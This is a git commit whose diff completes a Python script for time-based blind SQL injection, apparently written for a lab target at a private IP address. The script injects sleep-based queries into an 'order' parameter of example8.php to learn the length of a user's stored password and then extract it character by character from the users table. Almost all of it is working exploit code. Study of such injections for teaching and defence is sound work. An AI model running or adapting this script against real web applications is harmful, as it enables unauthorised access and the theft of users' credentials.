a31770dc0daaa21ad5d8716445ca4d85f66808af
Mattia Massarenti <mattia.mas2003@gmail.com>
2026-06-22 20:01:05 +0200

    complete blind sql injection
    the script obtains password length and password text of a user given its id and a basic knowledge of the website's database (table name and password field name)

--- blind-sql-injection/script.py
+++ blind-sql-injection/script.py
@@ -1,12 +1,33 @@
 import requests
 
-ip = '155.185.124.242'
-sql = 'select sleep(3)'
-url = f"http://{ip}/sqli/example8.php?order=id`,({sql}) -- `"
-print("Expected URL:", url)
+ip = '192.168.1.58'
 
-response = requests.get(url)
-print("Actual URL:", response.url)
+def get(payload: str):
+    url = f'http://{ip}/sqli/example8.php?order=id`,({payload}) -- `'
+    print(f'GET {url}')
+    return requests.get(url)
 
-if response.elapsed.seconds >= 3 and response.ok:
-    print(f'Success: {response.elapsed.seconds}')
+password_length = 1
+while True:
+    sql = f'SELECT sleep(3) FROM dual WHERE LENGTH((SELECT passwd FROM users WHERE id=1))={password_length}'
+    response = get(sql)
+
+    if response.elapsed.seconds >= 3 and response.ok:
+        print(f'Success: waited for {response.elapsed.seconds} s')
+        break
+    password_length += 1
+
+print("Password lenght is:", password_length)
+
+password = []
+for i in range(5):
+    for c in range(256):
+        sql = f'SELECT sleep(3) FROM dual WHERE ASCII(SUBSTRING((SELECT passwd FROM users WHERE id=1), {i + 1}, 1))={c}'
+        response = get(sql)
+
+        if response.elapsed.seconds >= 3 and response.ok:
+            print(f'Success [{i + 1}]: waited for {response.elapsed.seconds} s')
+            password.append(c)
+            break
+
+print("Password is: '" + ''.join(map(chr, password)) + "'")
